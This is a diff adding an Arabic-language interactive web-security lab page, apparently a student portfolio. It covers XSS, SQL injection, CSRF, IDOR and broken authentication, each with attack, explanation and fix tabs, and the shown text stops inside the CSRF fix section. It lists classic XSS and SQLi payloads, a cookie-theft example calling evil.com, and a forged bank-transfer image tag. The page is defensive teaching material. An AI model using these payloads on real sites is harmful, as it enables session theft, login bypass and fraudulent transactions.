@@ -1,0 +1,1395 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>VulnLab – Interactive Security Learning</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0a0f;
+    --surface: #111118;
+    --surface2: #1a1a25;
+    --border: #2a2a3a;
+    --accent: #00ff88;
+    --accent2: #ff3366;
+    --accent3: #3388ff;
+    --text: #e8e8f0;
+    --muted: #6b6b80;
+    --danger: #ff3366;
+    --warning: #ffaa00;
+    --success: #00ff88;
+    --info: #3388ff;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: 'Syne', sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh;
+  }
+
+  code, .mono {
+    font-family: 'JetBrains Mono', monospace;
+  }
+
+  /* ─── NAV ─── */
+  nav {
+    border-bottom: 1px solid var(--border);
+    padding: 1rem 2rem;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    position: sticky;
+    top: 0;
+    background: var(--bg);
+    z-index: 100;
+  }
+
+  .logo {
+    font-size: 1.4rem;
+    font-weight: 800;
+    letter-spacing: -1px;
+  }
+
+  .logo span { color: var(--accent); }
+
+  .nav-badge {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.7rem;
+    background: rgba(0,255,136,0.1);
+    color: var(--accent);
+    border: 1px solid rgba(0,255,136,0.3);
+    padding: 0.25rem 0.6rem;
+    border-radius: 4px;
+  }
+
+  /* ─── HERO ─── */
+  .hero {
+    padding: 5rem 2rem 4rem;
+    max-width: 900px;
+    margin: 0 auto;
+    text-align: center;
+  }
+
+  .hero-tag {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    color: var(--accent);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 1.5rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.5rem;
+  }
+
+  .hero-tag::before, .hero-tag::after {
+    content: '';
+    display: block;
+    width: 40px;
+    height: 1px;
+    background: var(--accent);
+    opacity: 0.5;
+  }
+
+  h1 {
+    font-size: clamp(2.5rem, 6vw, 4.5rem);
+    font-weight: 800;
+    line-height: 1.05;
+    letter-spacing: -2px;
+    margin-bottom: 1.5rem;
+  }
+
+  h1 .highlight { color: var(--accent); }
+  h1 .danger-text { color: var(--accent2); }
+
+  .hero p {
+    font-size: 1.1rem;
+    color: var(--muted);
+    max-width: 560px;
+    margin: 0 auto 2.5rem;
+    line-height: 1.7;
+  }
+
+  .warning-banner {
+    display: inline-flex;
+    align-items: center;
+    gap: 0.75rem;
+    background: rgba(255,170,0,0.08);
+    border: 1px solid rgba(255,170,0,0.25);
+    color: var(--warning);
+    padding: 0.75rem 1.25rem;
+    border-radius: 8px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+  }
+
+  /* ─── STATS ─── */
+  .stats {
+    display: flex;
+    justify-content: center;
+    gap: 3rem;
+    padding: 2rem;
+    border-top: 1px solid var(--border);
+    border-bottom: 1px solid var(--border);
+    margin: 0 2rem;
+  }
+
+  .stat {
+    text-align: center;
+  }
+
+  .stat-num {
+    font-size: 2rem;
+    font-weight: 800;
+    color: var(--accent);
+    font-family: 'JetBrains Mono', monospace;
+  }
+
+  .stat-label {
+    font-size: 0.8rem;
+    color: var(--muted);
+    margin-top: 0.25rem;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+
+  /* ─── SECTION ─── */
+  .section {
+    max-width: 1000px;
+    margin: 4rem auto;
+    padding: 0 2rem;
+  }
+
+  .section-header {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    margin-bottom: 2rem;
+  }
+
+  .section-header h2 {
+    font-size: 1.6rem;
+    font-weight: 800;
+    letter-spacing: -0.5px;
+  }
+
+  .section-line {
+    flex: 1;
+    height: 1px;
+    background: var(--border);
+  }
+
+  /* ─── LAB CARDS ─── */
+  .labs-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+    gap: 1px;
+    background: var(--border);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    overflow: hidden;
+  }
+
+  .lab-card {
+    background: var(--surface);
+    padding: 1.5rem;
+    cursor: pointer;
+    transition: background 0.15s;
+    position: relative;
+  }
+
+  .lab-card:hover { background: var(--surface2); }
+
+  .lab-card.active {
+    background: var(--surface2);
+    border-right: 3px solid var(--accent);
+  }
+
+  .lab-num {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.7rem;
+    color: var(--muted);
+    margin-bottom: 0.75rem;
+  }
+
+  .lab-title {
+    font-size: 1rem;
+    font-weight: 700;
+    margin-bottom: 0.5rem;
+  }
+
+  .lab-desc {
+    font-size: 0.85rem;
+    color: var(--muted);
+    line-height: 1.5;
+  }
+
+  .severity {
+    display: inline-block;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.65rem;
+    padding: 0.2rem 0.5rem;
+    border-radius: 3px;
+    margin-top: 0.75rem;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+
+  .sev-critical { background: rgba(255,51,102,0.15); color: var(--danger); border: 1px solid rgba(255,51,102,0.3); }
+  .sev-high { background: rgba(255,170,0,0.15); color: var(--warning); border: 1px solid rgba(255,170,0,0.3); }
+  .sev-medium { background: rgba(51,136,255,0.15); color: var(--info); border: 1px solid rgba(51,136,255,0.3); }
+
+  /* ─── LAB PLAYGROUND ─── */
+  .playground {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    overflow: hidden;
+    margin-top: 2rem;
+  }
+
+  .playground-tabs {
+    display: flex;
+    border-bottom: 1px solid var(--border);
+    background: var(--bg);
+  }
+
+  .tab-btn {
+    padding: 0.75rem 1.25rem;
+    background: none;
+    border: none;
+    color: var(--muted);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    cursor: pointer;
+    border-bottom: 2px solid transparent;
+    transition: all 0.15s;
+  }
+
+  .tab-btn.active {
+    color: var(--accent);
+    border-bottom-color: var(--accent);
+  }
+
+  .tab-content { display: none; padding: 2rem; }
+  .tab-content.active { display: block; }
+
+  /* ─── XSS LAB ─── */
+  .lab-panel {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 1.5rem;
+  }
+
+  @media (max-width: 700px) {
+    .lab-panel { grid-template-columns: 1fr; }
+    .stats { gap: 1.5rem; }
+  }
+
+  .input-group {
+    display: flex;
+    flex-direction: column;
+    gap: 0.5rem;
+    margin-bottom: 1rem;
+  }
+
+  .input-group label {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.75rem;
+    color: var(--muted);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+
+  .vuln-input {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text);
+    padding: 0.75rem 1rem;
+    border-radius: 6px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.9rem;
+    width: 100%;
+    transition: border-color 0.15s;
+  }
+
+  .vuln-input:focus {
+    outline: none;
+    border-color: var(--accent);
+  }
+
+  .btn {
+    padding: 0.75rem 1.5rem;
+    border: none;
+    border-radius: 6px;
+    font-family: 'Syne', sans-serif;
+    font-weight: 700;
+    font-size: 0.9rem;
+    cursor: pointer;
+    transition: all 0.15s;
+  }
+
+  .btn-primary {
+    background: var(--accent);
+    color: #000;
+  }
+
+  .btn-primary:hover { opacity: 0.85; }
+
+  .btn-danger {
+    background: var(--danger);
+    color: #fff;
+  }
+
+  .btn-outline {
+    background: transparent;
+    border: 1px solid var(--border);
+    color: var(--text);
+  }
+
+  .btn-outline:hover { border-color: var(--accent); color: var(--accent); }
+
+  /* ─── OUTPUT FRAME ─── */
+  .output-frame {
+    background: #fff;
+    border-radius: 8px;
+    min-height: 200px;
+    overflow: hidden;
+    border: 2px solid var(--border);
+    position: relative;
+  }
+
+  .frame-bar {
+    background: #f0f0f0;
+    padding: 0.5rem 1rem;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+    border-bottom: 1px solid #ddd;
+  }
+
+  .dot { width: 10px; height: 10px; border-radius: 50%; }
+  .dot.r { background: #ff5f56; }
+  .dot.y { background: #ffbd2e; }
+  .dot.g { background: #27c93f; }
+
+  .frame-bar span {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.7rem;
+    color: #888;
+    margin-right: auto;
+  }
+
+  .frame-body {
+    padding: 1rem;
+    min-height: 160px;
+    font-family: Arial, sans-serif;
+    color: #333;
+    font-size: 0.9rem;
+  }
+
+  /* ─── CODE BLOCK ─── */
+  .code-block {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 1.25rem;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    line-height: 1.7;
+    overflow-x: auto;
+  }
+
+  .code-block .kw { color: #ff79c6; }
+  .code-block .str { color: #f1fa8c; }
+  .code-block .cm { color: #6272a4; }
+  .code-block .fn { color: #50fa7b; }
+  .code-block .var { color: #8be9fd; }
+
+  /* ─── ALERT ─── */
+  .alert {
+    border-radius: 8px;
+    padding: 1rem 1.25rem;
+    font-size: 0.9rem;
+    line-height: 1.6;
+    margin: 1rem 0;
+  }
+
+  .alert-success {
+    background: rgba(0,255,136,0.08);
+    border: 1px solid rgba(0,255,136,0.25);
+    color: #00cc6a;
+  }
+
+  .alert-danger {
+    background: rgba(255,51,102,0.08);
+    border: 1px solid rgba(255,51,102,0.25);
+    color: var(--danger);
+  }
+
+  .alert-info {
+    background: rgba(51,136,255,0.08);
+    border: 1px solid rgba(51,136,255,0.25);
+    color: var(--info);
+  }
+
+  /* ─── SQL TABLE ─── */
+  .sql-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    margin-top: 1rem;
+  }
+
+  .sql-table th {
+    background: var(--surface2);
+    padding: 0.5rem 1rem;
+    text-align: right;
+    color: var(--accent);
+    border: 1px solid var(--border);
+  }
+
+  .sql-table td {
+    padding: 0.5rem 1rem;
+    border: 1px solid var(--border);
+    color: var(--text);
+  }
+
+  .sql-table tr:hover td { background: var(--surface2); }
+
+  /* ─── PAYLOAD HINTS ─── */
+  .payload-list {
+    list-style: none;
+    display: flex;
+    flex-wrap: wrap;
+    gap: 0.5rem;
+    margin-top: 1rem;
+  }
+
+  .payload-pill {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 0.3rem 0.6rem;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.75rem;
+    cursor: pointer;
+    color: var(--muted);
+    transition: all 0.15s;
+  }
+
+  .payload-pill:hover {
+    border-color: var(--accent);
+    color: var(--accent);
+  }
+
+  /* ─── SCORE ─── */
+  .score-bar {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    margin-bottom: 1.5rem;
+    padding: 1rem 1.5rem;
+    background: var(--bg);
+    border-radius: 8px;
+    border: 1px solid var(--border);
+  }
+
+  .score-label {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    color: var(--muted);
+  }
+
+  .score-val {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 1.2rem;
+    font-weight: 700;
+    color: var(--accent);
+    margin-right: auto;
+  }
+
+  .badge-solved {
+    background: rgba(0,255,136,0.15);
+    border: 1px solid rgba(0,255,136,0.4);
+    color: var(--success);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.7rem;
+    padding: 0.2rem 0.6rem;
+    border-radius: 4px;
+  }
+
+  /* ─── PROGRESS ─── */
+  .progress-track {
+    display: flex;
+    gap: 0.5rem;
+    margin-top: 1.5rem;
+  }
+
+  .progress-dot {
+    width: 10px;
+    height: 10px;
+    border-radius: 50%;
+    background: var(--border);
+    transition: background 0.3s;
+  }
+
+  .progress-dot.done { background: var(--accent); }
+
+  /* ─── FOOTER ─── */
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 2rem;
+    text-align: center;
+    color: var(--muted);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.75rem;
+    margin-top: 4rem;
+  }
+
+  footer a {
+    color: var(--accent);
+    text-decoration: none;
+  }
+
+  /* ─── CSRF LAB ─── */
+  .csrf-bank {
+    background: #1a3a5c;
+    border-radius: 8px;
+    padding: 1.5rem;
+    color: #e8f4fd;
+    font-family: Arial, sans-serif;
+  }
+
+  .csrf-bank h3 { font-size: 1rem; margin-bottom: 1rem; color: #7ab8e8; }
+
+  .csrf-balance {
+    font-size: 2rem;
+    font-weight: bold;
+    color: #4caf50;
+    margin: 1rem 0;
+  }
+
+  .csrf-form input, .csrf-form select {
+    background: rgba(255,255,255,0.1);
+    border: 1px solid rgba(255,255,255,0.2);
+    color: #fff;
+    padding: 0.5rem;
+    border-radius: 4px;
+    width: 100%;
+    margin-bottom: 0.5rem;
+    font-size: 0.85rem;
+  }
+
+  .csrf-btn {
+    background: #2196F3;
+    color: #fff;
+    border: none;
+    padding: 0.5rem 1.25rem;
+    border-radius: 4px;
+    cursor: pointer;
+    font-size: 0.85rem;
+    margin-top: 0.5rem;
+  }
+
+  /* Animations */
+  @keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.4; }
+  }
+
+  .blink { animation: pulse 1.5s infinite; }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(8px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  .fade-in { animation: fadeIn 0.3s ease; }
+
+  .terminal-cursor::after {
+    content: '█';
+    animation: pulse 1s infinite;
+    color: var(--accent);
+  }
+</style>
+</head>
+<body>
+
+<nav>
+  <div class="logo">Vuln<span>Lab</span></div>
+  <div style="display:flex;align-items:center;gap:1rem">
+    <span class="nav-badge mono">⚠ Educational Only</span>
+    <span id="nav-score" class="mono" style="font-size:0.85rem;color:var(--accent)">0 pts</span>
+  </div>
+</nav>
+
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-tag">Cybersecurity Portfolio Project</div>
+  <h1>
+    Learn to <span class="danger-text">Break</span><br>
+    to Learn to <span class="highlight">Protect</span>
+  </h1>
+  <p>مختبر ثغرات ويب تفاعلي — جرّب الهجمات الحقيقية بيئة آمنة، افهم لماذا تنجح، وتعلم كيف تحمي منها.</p>
+  <div class="warning-banner">
+    ⚠&nbsp; للأغراض التعليمية فقط — لا تطبّق على مواقع حقيقية دون إذن
+  </div>
+
+  <div class="progress-track" style="justify-content:center;margin-top:2rem" id="main-progress"></div>
+</div>
+
+<!-- STATS -->
+<div class="stats">
+  <div class="stat">
+    <div class="stat-num">5</div>
+    <div class="stat-label">Labs</div>
+  </div>
+  <div class="stat">
+    <div class="stat-num" id="stat-solved">0</div>
+    <div class="stat-label">Solved</div>
+  </div>
+  <div class="stat">
+    <div class="stat-num" id="stat-pts">0</div>
+    <div class="stat-label">Points</div>
+  </div>
+  <div class="stat">
+    <div class="stat-num">OWASP</div>
+    <div class="stat-label">Based on</div>
+  </div>
+</div>
+
+<!-- LABS -->
+<div class="section">
+  <div class="section-header">
+    <h2>المختبرات</h2>
+    <div class="section-line"></div>
+  </div>
+
+  <div class="labs-grid">
+    <div class="lab-card active" onclick="selectLab('xss')">
+      <div class="lab-num">LAB 01</div>
+      <div class="lab-title">Cross-Site Scripting (XSS)</div>
+      <div class="lab-desc">حقن سكريبت خبيث عبر حقل إدخال غير محمي.</div>
+      <div><span class="severity sev-critical">Critical</span></div>
+    </div>
+    <div class="lab-card" onclick="selectLab('sqli')">
+      <div class="lab-num">LAB 02</div>
+      <div class="lab-title">SQL Injection</div>
+      <div class="lab-desc">استخراج بيانات قاعدة البيانات عبر استعلامات خبيثة.</div>
+      <div><span class="severity sev-critical">Critical</span></div>
+    </div>
+    <div class="lab-card" onclick="selectLab('csrf')">
+      <div class="lab-num">LAB 03</div>
+      <div class="lab-title">CSRF Attack</div>
+      <div class="lab-desc">تنفيذ إجراءات بدون علم المستخدم باستغلال الجلسة.</div>
+      <div><span class="severity sev-high">High</span></div>
+    </div>
+    <div class="lab-card" onclick="selectLab('idor')">
+      <div class="lab-num">LAB 04</div>
+      <div class="lab-title">IDOR Vulnerability</div>
+      <div class="lab-desc">الوصول لبيانات مستخدمين آخرين بتعديل الـ ID.</div>
+      <div><span class="severity sev-high">High</span></div>
+    </div>
+    <div class="lab-card" onclick="selectLab('auth')">
+      <div class="lab-num">LAB 05</div>
+      <div class="lab-title">Broken Authentication</div>
+      <div class="lab-desc">تجاوز نظام المصادقة باستغلال ثغرات تصميمية.</div>
+      <div><span class="severity sev-medium">Medium</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- PLAYGROUND -->
+<div class="section" id="playground-section">
+  <div class="section-header">
+    <h2 id="lab-title">XSS Lab</h2>
+    <div class="section-line"></div>
+    <span id="lab-badge" class="severity sev-critical">Critical</span>
+  </div>
+
+  <div class="playground">
+    <div class="playground-tabs">
+      <button class="tab-btn active" onclick="switchTab('attack')">⚔ Attack</button>
+      <button class="tab-btn" onclick="switchTab('explain')">📖 Explanation</button>
+      <button class="tab-btn" onclick="switchTab('fix')">🛡 Fix It</button>
+    </div>
+
+    <div id="tab-attack" class="tab-content active"></div>
+    <div id="tab-explain" class="tab-content"></div>
+    <div id="tab-fix" class="tab-content"></div>
+  </div>
+</div>
+
+<footer>
+  <p>Built by <a href="#">Raad Alaswed</a> · Cybersecurity Engineering Student · <a href="https://raadalaswed.github.io/me/">GitHub profile </a></p>
+  <p style="margin-top:0.5rem;opacity:0.5">All labs run client-side in sandbox environment. No data is collected or transmitted.</p>
+</footer>
+
+<script>
+// ─── STATE ───
+const state = {
+  score: 0,
+  solved: {},
+  currentLab: 'xss',
+  csrfBalance: 5000,
+};
+
+const labs = {
+  xss: {
+    title: 'XSS Lab',
+    badge: 'sev-critical',
+    badgeText: 'Critical',
+    points: 100,
+  },
+  sqli: {
+    title: 'SQL Injection',
+    badge: 'sev-critical',
+    badgeText: 'Critical',
+    points: 150,
+  },
+  csrf: {
+    title: 'CSRF Attack',
+    badge: 'sev-high',
+    badgeText: 'High',
+    points: 120,
+  },
+  idor: {
+    title: 'IDOR Vulnerability',
+    badge: 'sev-high',
+    badgeText: 'High',
+    points: 100,
+  },
+  auth: {
+    title: 'Broken Authentication',
+    badge: 'sev-medium',
+    badgeText: 'Medium',
+    points: 80,
+  }
+};
+
+// ─── LABS CONTENT ───
+const labContent = {
+  xss: {
+    attack: `
+      <div class="score-bar">
+        <span class="score-label">المهمة:</span>
+        <span style="color:var(--text);font-size:0.9rem">نفّذ XSS يُظهر alert() في المتصفح</span>
+        <span class="score-val" id="xss-pts">${labs.xss.points} pts</span>
+        <span id="xss-badge" style="display:none" class="badge-solved">✓ SOLVED</span>
+      </div>
+      <div class="lab-panel">
+        <div>
+          <h3 style="margin-bottom:1rem;font-size:1rem">صفحة التعليقات (Vulnerable)</h3>
+          <div class="input-group">
+            <label>اسمك</label>
+            <input class="vuln-input" id="xss-name" placeholder="أدخل اسمك...">
+          </div>
+          <div class="input-group">
+            <label>تعليقك</label>
+            <textarea class="vuln-input" id="xss-comment" rows="3" placeholder="اكتب تعليقك هنا..."></textarea>
+          </div>
+          <button class="btn btn-primary" onclick="submitXSS()">نشر التعليق</button>
+          <div style="margin-top:1.5rem">
+            <div style="font-family:'JetBrains Mono',monospace;font-size:0.75rem;color:var(--muted);margin-bottom:0.5rem">HINT PAYLOADS — انقر للنسخ:</div>
+            <ul class="payload-list">
+              <li class="payload-pill" onclick="copyPayload('<script>alert(1)<\\/script>', 'xss-comment')">&lt;script&gt;alert(1)&lt;/script&gt;</li>
+              <li class="payload-pill" onclick="copyPayload('<img src=x onerror=alert(\\'XSS!\\')>', 'xss-comment')">&lt;img onerror=alert()&gt;</li>
+              <li class="payload-pill" onclick="copyPayload('<svg onload=alert(document.cookie)>', 'xss-comment')">&lt;svg onload=alert()&gt;</li>
+            </ul>
+          </div>
+        </div>
+        <div>
+          <div class="output-frame">
+            <div class="frame-bar">
+              <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
+              <span>vulnerable-site.com/comments</span>
+            </div>
+            <div class="frame-body" id="xss-output">
+              <p style="color:#999;font-style:italic">لا توجد تعليقات بعد...</p>
+            </div>
+          </div>
+          <div id="xss-result" style="margin-top:1rem"></div>
+        </div>
+      </div>
+    `,
+    explain: `
+      <h3 style="margin-bottom:1rem">ما هو XSS؟</h3>
+      <p style="color:var(--muted);line-height:1.8;margin-bottom:1.5rem">
+        Cross-Site Scripting (XSS) هو نوع من الهجمات يسمح للمهاجم بحقن كود JavaScript ضار داخل صفحات 
+        الويب التي يراها المستخدمون الآخرون. ينجح الهجوم عندما يعرض الموقع مدخلات المستخدم مباشرة دون 
+        تنظيف أو ترميز.
+      </p>
+      <div style="margin-bottom:2rem">
+        <div style="font-size:0.85rem;color:var(--muted);margin-bottom:0.5rem;font-family:'JetBrains Mono',monospace">الكود الضعيف:</div>
+        <div class="code-block">
+<span class="cm">// ❌ VULNERABLE — يعرض المدخل مباشرة</span>
+<span class="var">output</span>.<span class="fn">innerHTML</span> = <span class="var">userInput</span>;
+
+<span class="cm">// المهاجم يدخل:</span>
+<span class="str">"&lt;script&gt;fetch('evil.com?c='+document.cookie)&lt;/script&gt;"</span>
+        </div>
+      </div>
+      <div class="alert alert-danger">
+        <strong>الخطر:</strong> يمكن للمهاجم سرقة الكوكيز، تحويل المستخدمين لمواقع ضارة، تنفيذ أي JavaScript بصلاحيات المستخدم الضحية.
+      </div>
+    `,
+    fix: `
+      <h3 style="margin-bottom:1rem">كيف تحمي من XSS؟</h3>
+      <div class="alert alert-success" style="margin-bottom:1.5rem">المبدأ: لا تثق بأي مدخل من المستخدم — نظّفه قبل عرضه.</div>
+      <div class="code-block" style="margin-bottom:1.5rem">
+<span class="cm">// ✅ SAFE — استخدم textContent بدل innerHTML</span>
+<span class="kw">const</span> <span class="var">safe</span> = <span class="var">document</span>.<span class="fn">createElement</span>(<span class="str">'p'</span>);
+<span class="var">safe</span>.<span class="fn">textContent</span> = <span class="var">userInput</span>; <span class="cm">// auto-escapes</span>
+<span class="var">container</span>.<span class="fn">appendChild</span>(<span class="var">safe</span>);
+
+<span class="cm">// ✅ أو sanitize المدخل:</span>
+<span class="kw">function</span> <span class="fn">sanitize</span>(<span class="var">str</span>) {
+  <span class="kw">return</span> <span class="var">str</span>
+    .<span class="fn">replace</span>(<span class="str">/&amp;/g</span>, <span class="str">'&amp;amp;'</span>)
+    .<span class="fn">replace</span>(<span class="str">/&lt;/g</span>, <span class="str">'&amp;lt;'</span>)
+    .<span class="fn">replace</span>(<span class="str">/&gt;/g</span>, <span class="str">'&amp;gt;'</span>)
+    .<span class="fn">replace</span>(<span class="str">/"/g</span>, <span class="str">'&amp;quot;'</span>);
+}
+      </div>
+      <div class="alert alert-info">
+        <strong>أيضاً:</strong> استخدم Content Security Policy (CSP) header، و HttpOnly للكوكيز، و إطارات عمل مثل React التي تعالج XSS تلقائياً.
+      </div>
+      <button class="btn btn-outline" style="margin-top:1.5rem" onclick="demoFix('xss')">🛡 جرّب النسخة الآمنة</button>
+      <div id="fix-demo-xss"></div>
+    `
+  },
+
+  sqli: {
+    attack: `
+      <div class="score-bar">
+        <span class="score-label">المهمة:</span>
+        <span style="color:var(--text);font-size:0.9rem">تجاوز تسجيل الدخول واستخرج بيانات المستخدمين</span>
+        <span class="score-val">${labs.sqli.points} pts</span>
+        <span id="sqli-badge" style="display:none" class="badge-solved">✓ SOLVED</span>
+      </div>
+      <div class="lab-panel">
+        <div>
+          <h3 style="margin-bottom:1rem;font-size:1rem">صفحة تسجيل الدخول</h3>
+          <div class="input-group">
+            <label>اسم المستخدم</label>
+            <input class="vuln-input" id="sqli-user" placeholder="admin" value="admin">
+          </div>
+          <div class="input-group">
+            <label>كلمة المرور</label>
+            <input class="vuln-input" id="sqli-pass" placeholder="أدخل payload هنا...">
+          </div>
+          <button class="btn btn-primary" onclick="submitSQLi()">تسجيل الدخول</button>
+          <div style="margin-top:1.5rem">
+            <div style="font-family:'JetBrains Mono',monospace;font-size:0.75rem;color:var(--muted);margin-bottom:0.5rem">PAYLOADS:</div>
+            <ul class="payload-list">
+              <li class="payload-pill" onclick="copyPayload(\\`' OR '1'='1\\`, 'sqli-pass')">' OR '1'='1</li>
+              <li class="payload-pill" onclick="copyPayload(\\`' OR 1=1--\\`, 'sqli-pass')">' OR 1=1--</li>
+              <li class="payload-pill" onclick="copyPayload(\\`admin'--\\`, 'sqli-pass')">admin'--</li>
+            </ul>
+          </div>
+        </div>
+        <div>
+          <div id="sqli-result">
+            <div class="alert alert-info">جرّب تسجيل الدخول بـ payload خبيث...</div>
+          </div>
+          <div id="sqli-table" style="margin-top:1rem"></div>
+        </div>
+      </div>
+    `,
+    explain: `
+      <h3 style="margin-bottom:1rem">ما هو SQL Injection؟</h3>
+      <p style="color:var(--muted);line-height:1.8;margin-bottom:1.5rem">
+        SQL Injection يحدث عندما يُضمّن المهاجم كود SQL داخل المدخلات ليتلاعب باستعلامات قاعدة البيانات. 
+        هو أخطر ثغرات الويب وأكثرها انتشاراً.
+      </p>
+      <div class="code-block" style="margin-bottom:1.5rem">
+<span class="cm">// استعلام ضعيف:</span>
+<span class="str">"SELECT * FROM users WHERE user='"</span> + <span class="var">username</span> + <span class="str">"'"</span>
+
+<span class="cm">// مع payload:  ' OR '1'='1</span>
+<span class="cm">// يصبح:</span>
+<span class="str">SELECT * FROM users WHERE user='' OR '1'='1'</span>
+<span class="cm">// ← يرجع كل المستخدمين!</span>
+      </div>
+      <div class="alert alert-danger">
+        <strong>الأضرار:</strong> تسريب كل البيانات، تجاوز المصادقة، حذف جداول كاملة (DROP TABLE)، والتحكم في الخادم.
+      </div>
+    `,
+    fix: `
+      <h3 style="margin-bottom:1rem">الحماية من SQL Injection</h3>
+      <div class="alert alert-success" style="margin-bottom:1.5rem">الحل: Prepared Statements — فصل الكود عن البيانات.</div>
+      <div class="code-block">
+<span class="cm">// ❌ VULNERABLE</span>
+<span class="var">db</span>.<span class="fn">query</span>(<span class="str">"SELECT * FROM users WHERE user='"</span> + <span class="var">input</span> + <span class="str">"'"</span>);
+
+<span class="cm">// ✅ SAFE — Prepared Statement</span>
+<span class="var">db</span>.<span class="fn">query</span>(<span class="str">"SELECT * FROM users WHERE user = ?"</span>, [<span class="var">input</span>]);
+
+<span class="cm">// ✅ Python مثال</span>
+<span class="var">cursor</span>.<span class="fn">execute</span>(
+  <span class="str">"SELECT * FROM users WHERE user = %s"</span>,
+  (<span class="var">username</span>,)
+)
+      </div>
+      <div class="alert alert-info" style="margin-top:1rem">أيضاً: استخدم ORM مثل SQLAlchemy أو Prisma، قلّل صلاحيات مستخدم قاعدة البيانات، وفعّل WAF.</div>
+    `
+  },
+
+  csrf: {
+    attack: `
+      <div class="score-bar">
+        <span class="score-label">المهمة:</span>
+        <span style="color:var(--text);font-size:0.9rem">اجعل المستخدم يحوّل أموالاً دون علمه</span>
+        <span class="score-val">${labs.csrf.points} pts</span>
+        <span id="csrf-badge" style="display:none" class="badge-solved">✓ SOLVED</span>
+      </div>
+      <div class="lab-panel">
+        <div>
+          <h3 style="margin-bottom:1rem;font-size:1rem">موقع البنك (ضعيف)</h3>
+          <div class="csrf-bank">
+            <h3>🏦 SecureBank™</h3>
+            <div style="font-size:0.8rem;opacity:0.7">الرصيد الحالي</div>
+            <div class="csrf-balance" id="csrf-balance">$<span id="csrf-bal-num">5,000</span></div>
+            <div class="csrf-form">
+              <input type="number" id="csrf-amount" placeholder="المبلغ" value="100">
+              <input type="text" id="csrf-to" placeholder="حساب المستلم" value="attacker-account">
+              <button class="csrf-btn" onclick="normalTransfer()">تحويل</button>
+            </div>
+          </div>
+          <div style="margin-top:1rem;padding:0.75rem;background:var(--bg);border-radius:8px;border:1px solid var(--border)">
+            <div style="font-family:'JetBrains Mono',monospace;font-size:0.7rem;color:var(--muted);margin-bottom:0.5rem">CSRF ATTACK PAGE:</div>
+            <button class="btn btn-danger" onclick="csrfAttack()">⚡ تنفيذ CSRF Attack</button>
+          </div>
+        </div>
+        <div>
+          <div id="csrf-result">
+            <div class="alert alert-info">انقر "تنفيذ CSRF Attack" لرؤية كيف يعمل الهجوم...</div>
+          </div>
+        </div>
+      </div>
+    `,
+    explain: `
+      <h3 style="margin-bottom:1rem">ما هو CSRF؟</h3>
+      <p style="color:var(--muted);line-height:1.8;margin-bottom:1.5rem">
+        Cross-Site Request Forgery يخدع المتصفح ليرسل طلبات إلى موقع تسجّل فيه المستخدم، 
+        مستغلاً الكوكيز المحفوظة تلقائياً. المستخدم لا يعلم أن شيئاً حدث.
+      </p>
+      <div class="code-block" style="margin-bottom:1.5rem">
+<span class="cm">&lt;!-- صفحة المهاجم تحتوي: --&gt;</span>
+<span class="str">&lt;img src="https://bank.com/transfer?to=attacker&amp;amount=1000"&gt;</span>
+<span class="cm">&lt;!-- المتصفح يرسل الكوكيز تلقائياً ← تنفيذ التحويل! --&gt;</span>
+      </div>
+      <div class="alert alert-danger">يمكن تنفيذ أي إجراء للمستخدم: تغيير البريد، الحذف، التحويلات المالية.</div>
+    `,
+    fix: `
+      <h3 style="margin-bottom:1rem">الحماية من CSRF</h3>
+      <div class="code-block" style="margin-bottom:1rem">
+<span class="cm">// ✅ CSRF Token في كل form</span>
+<span class="str">&lt;input type="hidden" name="csrf_token" value="<span class="var">RANDOM_TOKEN</span>"&gt;</span>
+
+<span class="cm">// ✅ SameSite Cookie</span>
